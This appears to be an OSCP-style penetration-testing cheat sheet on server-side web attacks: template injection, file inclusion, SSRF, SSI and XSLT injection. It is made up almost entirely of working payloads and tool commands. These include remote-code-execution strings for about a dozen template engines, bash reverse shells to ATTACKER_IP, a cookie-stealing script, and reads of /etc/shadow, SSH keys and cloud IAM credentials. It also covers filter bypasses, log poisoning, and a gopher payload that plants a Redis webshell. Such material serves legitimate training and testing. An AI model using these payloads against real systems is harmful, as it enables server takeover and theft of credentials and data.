# Server-Side Attacks — Complete OSCP Methodology



---

## Table of Contents

1. [Server-Side Template Injection (SSTI)](#1-server-side-template-injection-ssti)
2. [SSTI — Template Identification](#2-ssti--template-identification)
3. [SSTI — Jinja2 (Python / Flask)](#3-ssti--jinja2)
4. [SSTI — Twig (PHP / Symfony)](#4-ssti--twig)
5. [SSTI — Freemarker (Java)](#5-ssti--freemarker)
6. [SSTI — Velocity (Java)](#6-ssti--velocity)
7. [SSTI — Thymeleaf (Java / Spring)](#7-ssti--thymeleaf)
8. [SSTI — Mako (Python)](#8-ssti--mako)
9. [SSTI — Smarty (PHP)](#9-ssti--smarty)
10. [SSTI — ERB (Ruby)](#10-ssti--erb)
11. [SSTI — Pebble (Java)](#11-ssti--pebble)
12. [SSTI — Handlebars / Mustache (Node.js)](#12-ssti--handlebars--mustache)
13. [SSTI — Razor (.NET)](#13-ssti--razor)
14. [SSTI Automation — SSTImap & tplmap](#14-ssti-automation)
15. [Local File Inclusion (LFI) & Remote File Inclusion (RFI)](#15-local-file-inclusion-lfi--remote-file-inclusion-rfi)
16. [Server-Side Request Forgery (SSRF)](#16-server-side-request-forgery-ssrf)
17. [Server-Side Includes (SSI) Injection](#17-server-side-includes-ssi-injection)
18. [XSLT Injection](#18-xslt-injection)
19. [Master Checklist](#19-master-checklist)
20. [External References](#20-external-references)

---

## 1. Server-Side Template Injection (SSTI)

### What Is It

User input is embedded directly into a server-side template and rendered by the template engine. Instead of treating input as data, the engine executes it as template code.

```
User input → Template engine renders it → Code execution on server
```

### Where to Look

- Any field whose value is **reflected back** in a rendered page
- Email templates (custom greeting, name)
- PDF/report generators
- CMS pages with dynamic content
- Error pages that display user input
- URL path segments rendered in page title/breadcrumbs
- Profile fields (display name, bio)

### Quick Detection

```
# Inject math expressions — if evaluated, template engine is processing input

{{7*7}}        → 49 = Jinja2, Twig, or similar
${7*7}         → 49 = Freemarker, Thymeleaf, Mako, or JSP EL
<%= 7*7 %>     → 49 = ERB (Ruby)
#{7*7}         → 49 = Pebble, Thymeleaf
{7*7}          → 49 = Smarty (older versions)
${7*7}         → 49 = Velocity (sometimes)
```

---

## 2. SSTI — Template Identification

### Decision Tree

```
Inject: {{7*7}}
├── 49 → Inject: {{7*'7'}}
│   ├── 7777777 → Jinja2 (Python)
│   └── 49      → Twig (PHP)
├── ${7*7} = 49
│   ├── Check for Java → Freemarker, Velocity, Thymeleaf, Pebble
│   └── Check for Python → Mako
├── <%= 7*7 %> = 49 → ERB (Ruby)
├── #{7*7} = 49 → Pebble or Thymeleaf (Java)
├── {7*7} = 49 → Smarty (PHP)
└── Nothing works → Not SSTI, or less common engine
```

### Fingerprinting Payloads

| Payload | Engine if it works |
|---|---|
| `{{7*7}}` = 49 | Jinja2, Twig, Nunjucks, Angular (client) |
| `{{7*'7'}}` = `7777777` | **Jinja2** |
| `{{7*'7'}}` = `49` | **Twig** |
| `${7*7}` = 49 | Freemarker, Mako, Thymeleaf, EL |
| `<%= 7*7 %>` = 49 | **ERB** |
| `#{7*7}` = 49 | Pebble, Thymeleaf |
| `{7*7}` = 49 | Smarty (older) |
| `#set($x=7*7)${x}` = 49 | **Velocity** |
| `*{7*7}` = 49 | **Thymeleaf** |
| `@(1+1)` = 2 | **Razor** (.NET) |

---

## 3. SSTI — Jinja2

**Language:** Python (Flask, Django with Jinja2)

### RCE Payloads

```python
# Basic RCE — access os module via MRO chain
{{ ''.__class__.__mro__[1].__subclasses__() }}
# Find the index of <class 'os._wrap_close'> or subprocess.Popen

# Direct RCE (common working payloads)
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
# Replace INDEX with the subprocess.Popen index from subclasses list

# Most reliable — lipsum trick
{{ lipsum.__globals__["os"].popen("id").read() }}

# cycler trick
{{ cycler.__init__.__globals__.os.popen("id").read() }}

# joiner trick
{{ joiner.__init__.__globals__.os.popen("id").read() }}

# namespace trick
{{ namespace.__init__.__globals__.os.popen("id").read() }}

# Request object (Flask)
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### File Read

```python
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('/etc/passwd').read() }}
# INDEX = index of <class '_io.FileIO'> or file class

{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}
```

### Reverse Shell

```python
{{ lipsum.__globals__["os"].popen("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'").read() }}

{{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'").read() }}
```

### Filter Bypass — Jinja2

```python
# Dot notation blocked — use [] and |attr()
{{ ''['__class__']['__mro__'][1]['__subclasses__']() }}
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1) }}

# Underscores blocked — use request object or hex
{{ request|attr(request.args.a) }}  # with ?a=__class__
{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}

# Quotes blocked — use request args
{{ lipsum.__globals__[request.args.cmd].popen(request.args.arg).read() }}
# URL: ?cmd=os&arg=id

# {{ }} blocked — use {% %}
{% for x in ''.__class__.__mro__[1].__subclasses__() %}{% if 'warn' in x.__name__ %}{{ x.__init__.__globals__['os'].popen('id').read() }}{% endif %}{% endfor %}

# Brackets blocked — use |attr and |int filters
```

---

## 4. SSTI — Twig

**Language:** PHP (Symfony)

### RCE Payloads

```php
# Twig 1.x
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}

# Twig 2.x / 3.x
{{ ['id'] | filter('system') }}
{{ ['id'] | map('system') }}
{{ ['cat /etc/passwd'] | filter('system') }}
{{ ['id'] | reduce('system') }}
{{ ['id'] | sort('system') }}

# Reverse shell
{{ ['bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'] | filter('system') }}
```

### File Read

```php
{{ '/etc/passwd' | file_excerpt(0, -1) }}
{{ source('/etc/passwd') }}
{{ include('/etc/passwd') }}
```

---

## 5. SSTI — Freemarker

**Language:** Java

### RCE Payloads

```java
# Execute class
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ex("id")}

# ObjectConstructor
<#assign ob = "freemarker.template.utility.ObjectConstructor"?new()>
<#assign rt = ob("java.lang.Runtime")>
${rt.getRuntime().exec("id")}

# JythonRuntime (if Jython available)
<#assign jy = "freemarker.template.utility.JythonRuntime"?new()>
<@jy>import os; os.system("id")</@jy>
```

### File Read

```java
<#assign file = "freemarker.template.utility.Execute"?new()>
${file("cat /etc/passwd")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

### Reverse Shell

```java
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ex("bash -c {echo,BASE64_ENCODED_REVSHELL}|{base64,-d}|{bash,-i}")}
```

---

## 6. SSTI — Velocity

**Language:** Java (Apache Velocity)

### RCE Payloads

```java
# Using Runtime
#set($rt = $class.inspect("java.lang.Runtime").type)
#set($runtime = $rt.getRuntime())
$runtime.exec("id")

# Alternative
#set($e = "")
#set($rt = $e.class.forName("java.lang.Runtime"))
#set($getrt = $rt.getMethod("getRuntime", null))
#set($runtime = $getrt.invoke(null, null))
#set($process = $runtime.exec("id"))
#set($reader = $process.getInputStream())
#foreach($i in [1..$reader.available()])$reader.read()#end

# ProcessBuilder
#set($pb = $class.inspect("java.lang.ProcessBuilder").type)
#set($process = $pb.getDeclaredConstructors()[0].newInstance([["id"]]))
$process.start()
```

---

## 7. SSTI — Thymeleaf

**Language:** Java (Spring Boot)

### RCE Payloads

```java
# Expression preprocessing
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x

# URL path-based (Spring controller)
# If input goes into a template name:
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()}__::.x

# Spring EL
${T(java.lang.Runtime).getRuntime().exec('id')}

# With output
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

### File Read

```java
${T(java.nio.file.Files).readString(T(java.nio.file.Path).of('/etc/passwd'))}
```

---

## 8. SSTI — Mako

**Language:** Python

### RCE Payloads

```python
# Direct Python execution
<% import os; os.system('id') %>

# With output capture
<%
import subprocess
x = subprocess.check_output(['id']).decode()
%>
${x}

# One-liner
${__import__('os').popen('id').read()}

# Reverse shell
<% import os; os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") %>
```

---

## 9. SSTI — Smarty

**Language:** PHP

### RCE Payloads

```php
# Smarty 3.x (before security policy)
{system('id')}
{exec('id')}
{passthru('id')}

# Using php tag (older Smarty)
{php}system('id');{/php}

# Smarty 3 with security
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}

# If tags like {if} are allowed
{if system('id')}{/if}
{if exec('id')}{/if}
{if passthru('id')}{/if}

# Using literal/string
{literal}<script>document.location='http://ATTACKER_IP/?c='+document.cookie</script>{/literal}
```

---

## 10. SSTI — ERB

**Language:** Ruby (Rails)

### RCE Payloads

```ruby
<%= system('id') %>
<%= `id` %>
<%= exec('id') %>
<%= IO.popen('id').read %>

# File read
<%= File.read('/etc/passwd') %>
<%= File.open('/etc/passwd').read %>

# Reverse shell
<%= system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") %>
<%= `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'` %>
```

---

## 11. SSTI — Pebble

**Language:** Java

### RCE Payloads

```java
# Variable assignment + exec
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes, 0, bytes.length) }}

# Shorter
{{ ''['class'].forName('java.lang.Runtime').methods[6].invoke(null,null).exec('id') }}
```

---

## 12. SSTI — Handlebars / Mustache

**Language:** Node.js

### Handlebars RCE

```javascript
// Handlebars prototype pollution + RCE
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Mustache

Mustache is logic-less — generally not vulnerable to RCE. But check for custom helpers that may be exploitable.

---

## 13. SSTI — Razor

**Language:** C# / .NET

### RCE Payloads

```csharp
@(1+1)                                    // Confirm: outputs 2
@System.Diagnostics.Process.Start("cmd", "/c whoami")
@{var p = new System.Diagnostics.Process();p.StartInfo.FileName="cmd";p.StartInfo.Arguments="/c whoami";p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();var o=p.StandardOutput.ReadToEnd();p.WaitForExit();}@o
```

---

## 14. SSTI Automation

### SSTImap

```bash
# Install
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap && pip3 install -r requirements.txt

# Basic scan
python3 sstimap.py -u "http://target.com/page?name=test"

# POST data
python3 sstimap.py -u "http://target.com/page" -d "name=test"

# With cookies
python3 sstimap.py -u "http://target.com/page?name=test" --cookie "session=abc"

# Force specific engine
python3 sstimap.py -u "http://target.com/page?name=test" -e jinja2

# Get OS shell
python3 sstimap.py -u "http://target.com/page?name=test" --os-shell

# Execute command
python3 sstimap.py -u "http://target.com/page?name=test" --os-cmd "id"

# Read file
python3 sstimap.py -u "http://target.com/page?name=test" --file-read "/etc/passwd"

# Write file
python3 sstimap.py -u "http://target.com/page?name=test" --file-write "./shell.php" --file-dest "/var/www/html/shell.php"

# Reverse shell
python3 sstimap.py -u "http://target.com/page?name=test" --reverse-shell ATTACKER_IP 4444
```

### tplmap (Legacy but Still Useful)

```bash
# Install
git clone https://github.com/epinna/tplmap.git
cd tplmap && pip install -r requirements.txt

# Basic scan
python2 tplmap.py -u "http://target.com/page?name=test"

# OS shell
python2 tplmap.py -u "http://target.com/page?name=test" --os-shell

# OS command
python2 tplmap.py -u "http://target.com/page?name=test" --os-cmd "id"
```

---

## 15. Local File Inclusion (LFI) & Remote File Inclusion (RFI)

### Detection

```bash
# Basic LFI
?page=../../../etc/passwd
?file=../../../etc/passwd
?include=../../../etc/passwd
?path=../../../etc/passwd
?template=../../../etc/passwd
?doc=../../../etc/passwd
?view=../../../etc/passwd
?lang=../../../etc/passwd

# Depth — keep adding ../
?page=../../../../../../../../etc/passwd

# Null byte termination (PHP < 5.3.4)
?page=../../../etc/passwd%00
?page=../../../etc/passwd%00.php

# Double encoding
?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# URL encoding
?page=..%2f..%2f..%2fetc%2fpasswd
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Path Traversal Bypass

```bash
# If ../ is stripped (non-recursive)
....//....//....//etc/passwd
..././..././..././etc/passwd

# If ../ is stripped recursively, try encoding
..%252f..%252f..%252fetc/passwd

# If path must start with /var/www/
/var/www/../../etc/passwd

# If .php is appended
../../../etc/passwd%00            # null byte (old PHP)
../../../etc/passwd/./././.       # long path truncation (old PHP, > 4096 chars)

# Windows
..\..\..\windows\system32\drivers\etc\hosts
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
```

### PHP Wrappers (LFI → Source Code / RCE)

```bash
# Read source code as base64 (bypasses PHP execution)
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/read=convert.base64-encode/resource=config.php
# Decode: echo "BASE64_OUTPUT" | base64 -d

# RCE via php://input (requires allow_url_include=On)
POST ?page=php://input
Body: <?php system('id'); ?>

# RCE via data:// (requires allow_url_include=On)
?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Expect wrapper (requires expect extension)
?page=expect://id

# ZIP wrapper
# 1. Create shell.php inside a zip
# 2. Upload the zip (as allowed extension)
# 3. Include: ?page=zip:///var/www/html/uploads/file.zip%23shell.php

# Phar wrapper (triggers deserialization)
?page=phar:///var/www/html/uploads/evil.phar
```

### LFI → RCE via Log Poisoning

```bash
# Step 1: Poison a log file with PHP code
# Apache access log:
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Or via nc:
nc target.com 80
GET /<?php system($_GET['cmd']); ?> HTTP/1.1
Host: target.com

# Step 2: Include the poisoned log
?page=../../../var/log/apache2/access.log&cmd=id
?page=../../../var/log/httpd/access_log&cmd=id

# Common log locations:
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/mail.log
/var/log/vsftpd.log
/proc/self/environ          # Environment variables (User-Agent in CGI)
/proc/self/fd/0-20          # File descriptors
/tmp/sess_<PHPSESSID>       # PHP session file
```

### LFI → RCE via /proc/self/environ

```bash
# If /proc/self/environ is readable:
# 1. Set User-Agent to PHP code
curl -A "<?php system(\$_GET['cmd']); ?>" "http://target.com/?page=../../../proc/self/environ&cmd=id"
```

### LFI → RCE via PHP Session

```bash
# 1. Set a session variable to PHP code
# (e.g., login page that stores username in session)
# Username: <?php system($_GET['cmd']); ?>

# 2. Include the session file
?page=../../../tmp/sess_<YOUR_PHPSESSID>&cmd=id
?page=../../../var/lib/php/sessions/sess_<YOUR_PHPSESSID>&cmd=id
```

### Remote File Inclusion (RFI)

```bash
# Requires allow_url_include=On (rare but check)
?page=http://ATTACKER_IP/shell.php
?page=http://ATTACKER_IP/shell.txt    # .txt still executed if included
?page=//ATTACKER_IP/shell.php         # Protocol-relative

# Host the shell:
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
python3 -m http.server 80
```

### Interesting Files to Read

```bash
# Linux
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/issue
/proc/version
/proc/self/environ
/proc/self/cmdline
/proc/sched_debug
/home/<user>/.ssh/id_rsa
/home/<user>/.ssh/authorized_keys
/home/<user>/.bash_history
/root/.ssh/id_rsa
/root/.bash_history
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.htaccess
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf

# Windows
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\Users\<user>\.ssh\id_rsa
```

### LFI Automation

```bash
# ffuf with LFI wordlist
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -u "http://target.com/page?file=FUZZ" -fs <normal_size>

# LFImap
pip3 install lfimap
lfimap -U "http://target.com/page?file=test"
```

---

## 16. Server-Side Request Forgery (SSRF)

### Detection

```bash
# Where to look — any parameter that fetches a URL or resource
?url=
?uri=
?path=
?page=
?file=
?load=
?fetch=
?redirect=
?dest=
?target=
?proxy=
?img=
?image=
?link=
?src=
?feed=
?to=
```

### Basic SSRF

```bash
# Internal services
?url=http://127.0.0.1
?url=http://localhost
?url=http://127.0.0.1:80
?url=http://127.0.0.1:8080
?url=http://127.0.0.1:3306
?url=http://127.0.0.1:6379      # Redis
?url=http://127.0.0.1:27017     # MongoDB

# Internal network scan
?url=http://192.168.0.1
?url=http://10.0.0.1
?url=http://172.16.0.1

# Cloud metadata (AWS)
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://169.254.169.254/latest/user-data

# Cloud metadata (GCP)
?url=http://metadata.google.internal/computeMetadata/v1/

# Cloud metadata (Azure)
?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Blind SSRF

No response content visible — use out-of-band detection:

```bash
# DNS callback
?url=http://UNIQUE_ID.burpcollaborator.net
?url=http://UNIQUE_ID.interact.sh

# HTTP callback
?url=http://ATTACKER_IP/ssrf-test
# Check your server logs for the request

# Time-based detection
# If internal host exists → faster response
# If internal host doesn't exist → timeout
# Compare response times for different IPs

# Blind SSRF exploitation — attack internal services
# Even without seeing the response, you can:
# 1. Port scan internal network (by response time)
# 2. Send crafted requests to internal services
# 3. Exploit services that act on received requests (webhooks, etc.)
```

### Gopher Protocol (SSRF → Internal Service Exploitation)

Gopher allows sending **raw TCP data** — exploit internal services that don't expect HTTP:

```bash
# Format: gopher://HOST:PORT/_<URL_ENCODED_RAW_DATA>

# Redis — write webshell via gopher
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a

# What the Redis commands do:
# flushall
# set 1 "\n\n<?php system($_GET["cmd"]); ?>\n\n"
# config set dir /var/www/html
# config set dbfilename shell.php
# save

# MySQL — query via gopher (unauthenticated access)
# Use Gopherus tool to generate payloads

# SMTP — send email via gopher
gopher://127.0.0.1:25/_HELO%20attacker%0d%0aMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0d%0aRCPT%20TO%3A%3Cvictim%40target.com%3E%0d%0aDATA%0d%0aSubject%3A%20SSRF%20Test%0d%0a%0d%0aYou%20have%20been%20hacked%0d%0a.%0d%0aQUIT

# FastCGI — RCE via gopher
# Use Gopherus to generate
```

### Gopherus — Generate Gopher Payloads

```bash
# Install
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus

# MySQL payload
python2 gopherus.py --exploit mysql

# PostgreSQL payload
python2 gopherus.py --exploit postgresql

# FastCGI payload (PHP-FPM → RCE)
python2 gopherus.py --exploit fastcgi

# Redis payload
python2 gopherus.py --exploit redis

# SMTP payload
python2 gopherus.py --exploit smtp

# Zabbix payload
python2 gopherus.py --exploit zabbix
```

### SSRF Filter Bypass

```bash
# Localhost bypass
http://127.0.0.1
http://0.0.0.0
http://0
http://127.1
http://127.0.1
http://2130706433        # Decimal for 127.0.0.1
http://0x7f000001        # Hex for 127.0.0.1
http://017700000001      # Octal for 127.0.0.1
http://[::1]             # IPv6 localhost
http://[0:0:0:0:0:ffff:127.0.0.1]
http://127.0.0.1.nip.io  # DNS that resolves to 127.0.0.1
http://localtest.me      # Resolves to 127.0.0.1
http://spoofed.burpcollaborator.net  # Your controlled DNS

# Protocol bypass
# If http:// blocked:
gopher://
dict://
file:///etc/passwd
sftp://
tftp://
ldap://
jar://

# URL parsing confusion
http://attacker.com@127.0.0.1       # HTTP basic auth → host is 127.0.0.1
http://127.0.0.1#@attacker.com      # Fragment
http://127.0.0.1%23@attacker.com    # URL-encoded #
http://attacker.com/redirect?url=http://127.0.0.1

# Open redirect → SSRF chain
?url=http://allowed-domain.com/redirect?to=http://127.0.0.1

# DNS rebinding
# Set up a DNS server that alternates between your IP and 127.0.0.1
# First resolution → your IP (passes allowlist check)
# Second resolution → 127.0.0.1 (actual request hits localhost)

# URL encoding
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
```

### SSRF → RCE Paths

```
SSRF → Redis → Write webshell via gopher
SSRF → FastCGI/PHP-FPM → RCE via gopher
SSRF → Cloud metadata → IAM creds → full cloud takeover
SSRF → Internal admin panel → Upload/config → RCE
SSRF → Internal API → Command execution endpoint
SSRF → Docker API (port 2375) → Container escape
SSRF → Kubernetes API → Pod exec
```

---

## 17. Server-Side Includes (SSI) Injection

### What Is It

SSI directives are processed by the web server before sending HTML. If user input is embedded in `.shtml` files or SSI-enabled pages, you can inject directives.

### Detection

```
Look for:
- Files with .shtml, .stm, .shtm extensions
- Server headers indicating SSI support (Apache mod_include)
- Error pages that process SSI
```

### Payloads

```html
<!-- Basic detection -->
<!--#echo var="DATE_LOCAL" -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="LAST_MODIFIED" -->

<!-- File read -->
<!--#include virtual="/etc/passwd" -->
<!--#include file="/etc/passwd" -->
<!--#exec cmd="cat /etc/passwd" -->

<!-- Command execution -->
<!--#exec cmd="id" -->
<!--#exec cmd="whoami" -->
<!--#exec cmd="ls -la" -->

<!-- Reverse shell -->
<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" -->

<!-- Environment variables -->
<!--#echo var="REMOTE_ADDR" -->
<!--#echo var="HTTP_USER_AGENT" -->
<!--#echo var="QUERY_STRING" -->
<!--#printenv -->
```

### SSI in Edge Cases

```html
<!-- In User-Agent or Referer (if logged to SSI-processed page) -->
User-Agent: <!--#exec cmd="id" -->
Referer: <!--#exec cmd="id" -->

<!-- In upload filename -->
filename="<!--#exec cmd='id' -->.shtml"

<!-- In error pages -->
Request: GET /<!--#exec cmd="id" --> HTTP/1.1
```

---

## 18. XSLT Injection

### What Is It

XSLT (eXtensible Stylesheet Language Transformations) transforms XML documents. If user input controls the XSLT stylesheet or is embedded in one, you can achieve file read or RCE.

### Detection

```xml
<!-- If the app processes XML with an XSLT stylesheet and you control part of it -->
<!-- Test with version detection -->
<xsl:value-of select="system-property('xsl:version')"/>
<xsl:value-of select="system-property('xsl:vendor')"/>
<xsl:value-of select="system-property('xsl:vendor-url')"/>
```

### Processors & What They Support

| Processor | Language | File Read | RCE |
|---|---|---|---|
| **Xalan** | Java | Yes | Limited |
| **Saxon** | Java | Yes | Yes (extensions) |
| **libxslt** | C (PHP, Python, Ruby) | Yes | Limited |
| **MSXML** | .NET / Windows | Yes | Yes (scripting) |

### File Read

```xml
<!-- Using document() function -->
<xsl:value-of select="document('/etc/passwd')"/>

<!-- Using unparsed-text() (XSLT 2.0+, Saxon) -->
<xsl:value-of select="unparsed-text('/etc/passwd')"/>

<!-- Via include/import -->
<xsl:include href="/etc/passwd"/>
```

### RCE — PHP (libxslt with registerPHPFunctions)

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">

  <xsl:template match="/">
    <xsl:value-of select="php:function('system', 'id')"/>
  </xsl:template>

</xsl:stylesheet>
```

### RCE — Java (Xalan)

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">

  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtobject,'id')"/>
    <xsl:value-of select="$process"/>
  </xsl:template>

</xsl:stylesheet>
```

### RCE — .NET (MSXML Scripting)

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:user="urn:my-scripts">

  <msxsl:script language="C#" implements-prefix="user">
    <![CDATA[
    public string execute(){
      System.Diagnostics.Process proc = new System.Diagnostics.Process();
      proc.StartInfo.FileName = "cmd.exe";
      proc.StartInfo.Arguments = "/c whoami";
      proc.StartInfo.UseShellExecute = false;
      proc.StartInfo.RedirectStandardOutput = true;
      proc.Start();
      return proc.StandardOutput.ReadToEnd();
    }
    ]]>
  </msxsl:script>

  <xsl:template match="/">
    <xsl:value-of select="user:execute()"/>
  </xsl:template>

</xsl:stylesheet>
```

### SSRF via XSLT

```xml
<!-- Fetch external resource -->
<xsl:value-of select="document('http://ATTACKER_IP/ssrf')"/>
<xsl:include href="http://ATTACKER_IP/ssrf"/>
<xsl:import href="http://ATTACKER_IP/ssrf"/>
```

---

## 19. Master Checklist

### SSTI

- [ ] Test `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}` in all reflected inputs
- [ ] If math evaluates → identify the template engine (decision tree)
- [ ] Look up engine-specific RCE payload
- [ ] Try SSTImap / tplmap for automation
- [ ] If filtered → apply engine-specific bypass (attr filters, request args, encoding)
- [ ] Escalate to file read → reverse shell → privesc

### LFI

- [ ] Test `../../../etc/passwd` on all file/page/include parameters
- [ ] Try null byte `%00`, double encoding, `....//`
- [ ] Try PHP wrappers: `php://filter`, `php://input`, `data://`
- [ ] Try log poisoning (Apache, Nginx, mail, SSH)
- [ ] Try session file inclusion
- [ ] Try `/proc/self/environ` with poisoned User-Agent
- [ ] Fuzz with LFI wordlists

### RFI

- [ ] Test `?page=http://ATTACKER/shell.txt`
- [ ] Only works with `allow_url_include=On` (PHP)

### SSRF

- [ ] Test all URL/URI parameters with `http://127.0.0.1`
- [ ] Test cloud metadata: `http://169.254.169.254/`
- [ ] Try blind SSRF with Collaborator/interact.sh
- [ ] Test gopher:// for Redis, FastCGI, MySQL, SMTP
- [ ] Try localhost bypass: decimal, hex, IPv6, DNS rebinding
- [ ] Try protocol bypass: file://, gopher://, dict://
- [ ] Port scan internal network via SSRF
- [ ] Chain: SSRF → Redis → webshell → RCE

### SSI

- [ ] Check for .shtml files or SSI-enabled server
- [ ] Test `<!--#exec cmd="id" -->` in inputs
- [ ] Test in User-Agent and Referer headers
- [ ] Test in file upload filenames

### XSLT

- [ ] Check if app processes XML with XSLT
- [ ] Detect processor with `system-property('xsl:vendor')`
- [ ] Try `document('/etc/passwd')` for file read
- [ ] Try engine-specific RCE (PHP functions, Java Runtime, .NET scripting)
- [ ] Try SSRF via `document('http://ATTACKER/')`

---

## 20. External References

- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [PayloadsAllTheThings — SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [PayloadsAllTheThings — XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection)
- [HackTricks — SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
- [HackTricks — LFI](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)
- [HackTricks — SSRF](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html)
- [PortSwigger — SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf)
- [SSTImap](https://github.com/vladko312/SSTImap)
- [Gopherus](https://github.com/tarunkant/Gopherus)
- [LFImap](https://github.com/hansmach1ne/lfimap)
